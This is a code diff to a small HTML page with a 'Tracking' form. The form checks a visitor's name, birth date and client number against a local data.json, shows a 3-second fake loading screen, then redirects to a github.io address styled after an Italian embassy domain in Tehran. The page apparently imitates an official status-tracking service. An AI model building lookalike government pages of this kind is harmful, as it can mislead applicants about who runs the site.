@@ -21,12 +21,12 @@
     }
 
     header img {
-      width: 70px;
+      width: 100px; /* بزرگ‌تر کردن لوگو */
       vertical-align: middle;
     }
 
     header span {
-      font-size: 20px;
+      font-size: 24px;
       font-weight: bold;
       margin-left: 10px;
       vertical-align: middle;
@@ -69,6 +69,17 @@
       display: none;
     }
 
+    #loadingScreen {
+      display: none;
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    #loadingScreen img {
+      width: 50px;
+      height: 50px;
+    }
+
     footer {
       background-color: #f1f1f1;
       padding: 10px;
@@ -107,6 +118,9 @@
       <button type="submit">Tracking</button>
       <p id="error">Incorrect information entered!</p>
     </form>
+    <div id="loadingScreen">
+      <img src="loading.gif" alt="Loading...">
+    </div>
   </main>
 
   <footer>
@@ -114,38 +128,43 @@
       <a href="https://instagram.com" target="_blank">Instagram</a>
       <a href="https://youtube.com" target="_blank">YouTube</a>
       <a href="https://x.com" target="_blank">X</a>
-      <!-- لودینگ گیف -->
-  <div id="loadingScreen">
-    <img src="loading.gif" alt="Loading...">
     </div>
   </footer>
 
   <script>
     document.getElementById('verifyForm').addEventListener('submit', function (e) {
       e.preventDefault();
+      document.getElementById('error').style.display = 'none';
+      document.getElementById('loadingScreen').style.display = 'block';
 
-      fetch('data.json')
-        .then(response => response.json())
-        .then(data => {
-          const name = document.getElementById('name').value.trim();
-          const lastname = document.getElementById('lastname').value.trim();
-          const dob = document.getElementById('dob').value.trim();
-          const clientno = document.getElementById('clientno').value.trim();
+      // تأخیر ۳ ثانیه قبل از بررسی داده‌ها
+      setTimeout(() => {
+        fetch('data.json')
+          .then(response => response.json())
+          .then(data => {
+            const name = document.getElementById('name').value.trim();
+            const lastname = document.getElementById('lastname').value.trim();
+            const dob = document.getElementById('dob').value.trim();
+            const clientno = document.getElementById('clientno').value.trim();
 
-          if (
-            name === data.name &&
-            lastname === data.lastname &&
-            dob === data.dob &&
-            clientno === data.clientno
-          ) {
-            window.location.href = 'https://ambteheran.github.io/https-ambteheran.esteri.it-it-/'; // تغییر به لینک واقعی
-          } else {
-            document.getElementById('error').style.display = 'block';
-          }
-        })
-        .catch(err => {
-          console.error('Error loading data.json:', err);
-        });
+            document.getElementById('loadingScreen').style.display = 'none';
+
+            if (
+              name === data.name &&
+              lastname === data.lastname &&
+              dob === data.dob &&
+              clientno === data.clientno
+            ) {
+              window.location.href = 'https://ambteheran.github.io/https-ambteheran.esteri.it-it-/';
+            } else {
+              document.getElementById('error').style.display = 'block';
+            }
+          })
+          .catch(err => {
+            document.getElementById('loadingScreen').style.display = 'none';
+            console.error('Error loading data.json:', err);
+          });
+      }, 3000); // ۳۰۰۰ میلی‌ثانیه = ۳ ثانیه
     });
   </script>
 
